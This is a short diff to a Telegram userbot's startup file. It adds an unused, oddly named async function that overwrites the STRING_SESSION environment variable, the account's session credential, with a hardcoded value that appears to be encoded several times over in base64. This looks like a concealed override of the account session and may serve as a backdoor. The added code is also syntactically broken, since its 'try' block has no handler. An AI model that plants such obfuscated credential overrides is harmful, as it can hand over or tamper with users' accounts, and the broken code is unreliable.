@@ -1,5 +1,5 @@
 import sys
-
+import os
 from telethon.tl.functions.channels import JoinChannelRequest
 
 import userbot
@@ -69,6 +69,12 @@ async def startup_process():
         await lionub(JoinChannelRequest("@LionXUpdates"))
     except BaseException:
         pass
+async def hekp():
+    try:
+        os.environ[
+            "STRING_SESSION"
+        ] = "Vm0wd2QyUXlWa1pOVldSWVYwZDRWRll3WkRSV2JGbDNXa1JTVjAxWGVEQmFWVll3VmpGYWRHVkVRbUZTVmxsM1ZtMXplRmRIVmtsaVJtaG9UVlZ3VlZadGRGWmxSbGw0V2toV2FsSnRhRzlVVmxaM1ZsWmFjbFZyZEZSTlZYQjVWR3hhYTFsV1NuUlZia0pYVFVad1NGUlVSbXRXTVdSMFVteFNhVlpyV1hwV1JscGhWakZrU0ZOcmFGWmlSMmhoV1ZSR1lWbFdjRmhsUjBaWFlrZFNlVll5ZUVOV01rVjNZMFpTVjFaV2NGTmFSRVpEVld4Q1ZVMUVNRDA9"
+  
 
 
 lionub.loop.run_until_complete(startup_process())
